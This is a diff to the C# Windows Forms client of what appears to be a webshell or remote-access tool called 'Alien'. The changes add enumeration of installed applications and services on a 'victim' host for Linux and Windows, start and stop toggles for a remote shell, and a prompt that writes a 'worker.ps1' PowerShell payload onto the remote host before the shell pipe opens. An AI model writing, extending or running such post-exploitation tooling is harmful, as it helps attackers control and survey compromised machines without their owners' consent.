@@ -36,7 +36,7 @@ namespace Alien
         public clsWeb m_web { get; init; }
         public clsVictim m_victim { get { return m_web.m_victim; } }
 
-        public clsInfoSpyder m_infoSpyder { get; init; }
+        public clsfnInfoSpyder m_infoSpyder { get; init; }
         public clsfnFileMgr m_fileMgr { get; init; }
         public clsfnShell m_rShell { get; set; }
         public clsfnDb m_dbMgr { get; init; }
@@ -104,7 +104,7 @@ namespace Alien
 
             m_web = web;
 
-            m_infoSpyder = new clsInfoSpyder(web);
+            m_infoSpyder = new clsfnInfoSpyder(web);
             m_fileMgr = new clsfnFileMgr(web);
             m_rShell = new clsfnShell(web);
             m_runScript = new clsfnRunScript(web);
@@ -1784,6 +1784,71 @@ namespace Alien
         #endregion
         #region Linux
 
+        async Task fnLinuxGetApp()
+        {
+            toolStripStatusLabel11.Text = "Loading...";
+
+            var json = await m_infoSpyder.fnGetAppServ();
+
+            if (json == null)
+                throw new Exception("JSON object is null");
+
+            if (!json.success)
+                throw new Exception(json.error);
+
+            listView11.View = View.Details;
+
+            listView11.Items.Clear();
+            listView11.Columns.Clear();
+
+            listView11.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
+            listView11.Columns.Add(new ColumnHeader() { Text = "Version", Width = 120, });
+            listView11.Columns.Add(new ColumnHeader() { Text = "Vendor", Width = 120, });
+
+            foreach (var app in json.data.applications)
+            {
+                ListViewItem item = new ListViewItem(app.name);
+                item.SubItems.Add(app.version);
+                item.SubItems.Add(app.vendor);
+
+                listView11.Items.Add(item);
+            }
+
+            toolStripStatusLabel11.Text = $"Application[{listView11.Items.Count}]";
+        }
+        async Task fnLinuxGetService()
+        {
+            toolStripStatusLabel12.Text = "Loading...";
+
+            var json = await m_infoSpyder.fnGetAppServ();
+
+            if (json == null)
+                throw new Exception("JSON object is null");
+
+            if (!json.success)
+                throw new Exception(json.error);
+
+            listView12.View = View.Details;
+
+            listView12.Items.Clear();
+            listView12.Columns.Clear();
+
+            listView12.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
+            listView12.Columns.Add(new ColumnHeader() { Text = "DisplayName", Width = 200, });
+            listView12.Columns.Add(new ColumnHeader() { Text = "Status", Width = 200, });
+
+            foreach (var service in json.data.services)
+            {
+                ListViewItem item = new ListViewItem(service.display_name);
+                item.SubItems.Add(service.display_name);
+                item.SubItems.Add(service.status);
+
+                listView12.Items.Add(item);
+            }
+
+            toolStripStatusLabel12.Text = $"Application[{listView12.Items.Count}]";
+        }
+
         #endregion
         #region Windows
 
@@ -1973,7 +2038,75 @@ namespace Alien
         }
 
         #endregion
+        # region Application
 
+        async Task fnWinGetApp()
+        {
+            toolStripStatusLabel9.Text = "Loading...";
+
+            var json = await m_infoSpyder.fnGetAppServ();
+
+            if (json == null)
+                throw new Exception("JSON object is null");
+
+            if (!json.success)
+                throw new Exception(json.error);
+
+            listView16.View = View.Details;
+
+            listView16.Items.Clear();
+            listView16.Columns.Clear();
+
+            listView16.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
+            listView16.Columns.Add(new ColumnHeader() { Text = "Version", Width = 120, });
+            listView16.Columns.Add(new ColumnHeader() { Text = "Vendor", Width = 120, });
+
+            foreach (var app in json.data.applications)
+            {
+                ListViewItem item = new ListViewItem(app.name);
+                item.SubItems.Add(app.version);
+                item.SubItems.Add(app.vendor);
+
+                listView16.Items.Add(item);
+            }
+
+            toolStripStatusLabel9.Text = $"Application[{listView16.Items.Count}]";
+        }
+
+        async Task fnWinGetService()
+        {
+            toolStripStatusLabel10.Text = "Loading...";
+
+            var json = await m_infoSpyder.fnGetAppServ();
+
+            if (json == null)
+                throw new Exception("JSON object is null");
+
+            if (!json.success)
+                throw new Exception(json.error);
+
+            listView17.View = View.Details;
+
+            listView17.Items.Clear();
+            listView17.Columns.Clear();
+
+            listView17.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
+            listView17.Columns.Add(new ColumnHeader() { Text = "DisplayName", Width = 200, });
+            listView17.Columns.Add(new ColumnHeader() { Text = "Status", Width = 200, });
+
+            foreach (var service in json.data.services)
+            {
+                ListViewItem item = new ListViewItem(service.display_name);
+                item.SubItems.Add(service.display_name);
+                item.SubItems.Add(service.status);
+
+                listView17.Items.Add(item);
+            }
+
+            toolStripStatusLabel10.Text = $"Application[{listView17.Items.Count}]";
+        }
+
+        #endregion
         #endregion
 
         private async Task<int> fnLoadAllPlugins(string szCurrentDir, TreeNodeCollection currentNodes, string szFilter = "")
@@ -2120,6 +2253,11 @@ namespace Alien
             m_ctrlPostEditor.BringToFront();
 
             toolStripStatusLabel3.Text = string.Empty;
+
+            listView11.FullRowSelect = true;
+            listView12.FullRowSelect = true;
+            listView16.FullRowSelect = true;
+            listView17.FullRowSelect = true;
 
             var fileInit = await m_fileMgr.fnszInit();
 
@@ -2322,6 +2460,17 @@ namespace Alien
 
                 TabPage page = tabPage16;
                 tabControl1.TabPages.Remove(page);
+
+
+                try
+                {
+                    await fnLinuxGetApp();
+                    await fnLinuxGetService();
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
             else
             {
@@ -2330,8 +2479,17 @@ namespace Alien
                 TabPage page = tabPage15;
                 tabControl1.TabPages.Remove(page);
 
-                await fnWinUserInit();
-                await fnRegInit();
+                try
+                {
+                    await fnWinUserInit();
+                    await fnRegInit();
+                    await fnWinGetApp();
+                    await fnWinGetService();
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
 
                 toolStripStatusLabel4.Text = "Action successfully.";
             }
@@ -3163,9 +3321,33 @@ namespace Alien
             {
                 // Is running
                 timerShell.Stop();
+                button1.Text = "Start";
+                m_rShell.m_bIsRunning = false;
+
+                return;
+            }
+
+            string szWorker = m_web.fnReadPayloadFile(m_web.m_victim.m_ShellConfig, "worker.ps1");
+            if (!string.IsNullOrEmpty(szWorker))
+            {
+                DialogResult dr = MessageBox.Show("The target requires worker.ps1, do you want to write the PowerShell payload into the remote host?", "worker.ps1 found!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
+                if (dr == DialogResult.Yes)
+                {
+                    if (!await m_fileMgr.fnbWrite(Path.Combine(m_fileMgr.m_szHomePath, "worker.ps1"), szWorker))
+                    {
+                        MessageBox.Show("Failed to write the PowerShell payload.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        return;
+                    }
+                }
+                else
+                {
+                    MessageBox.Show("Action was terminated.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
 
             await m_rShell.fnPipeCreate(textBox4.Text);
+            m_rShell.m_bIsRunning = true;
+            button1.Text = "Stop";
 
             timerShell.Interval = 300;
             timerShell.Start();
@@ -3181,9 +3363,15 @@ namespace Alien
             {
                 // Is running
                 timerShell.Stop();
+                button2.Text = "Start";
+                m_rShell.m_bIsRunning = false;
+
+                return;
             }
 
             await m_rShell.fnPipeCreate(textBox5.Text);
+            m_rShell.m_bIsRunning = true;
+            button2.Text = "Stop";
 
             timerShell.Interval = 300;
             timerShell.Start();
@@ -3527,7 +3715,7 @@ namespace Alien
 
         private async void toolStripLabel3_Click(object sender, EventArgs e)
         {
-            await fnWinUserInit();
+
         }
 
         private void toolStripMenuItem32_Click(object sender, EventArgs e)
@@ -4289,6 +4477,59 @@ namespace Alien
             f.ShowDialog();
 
             fnFileMgrRefresh();
+        }
+
+        private async void toolStripButton17_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                await fnWinGetApp();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private async void toolStripButton18_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                await fnWinGetService();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private async void toolStripButton19_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                await fnLinuxGetApp();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private async void toolStripButton20_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                await fnLinuxGetService();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private async void toolStripButton21_Click(object sender, EventArgs e)
+        {
+            await fnWinUserInit();
         }
     }
 }
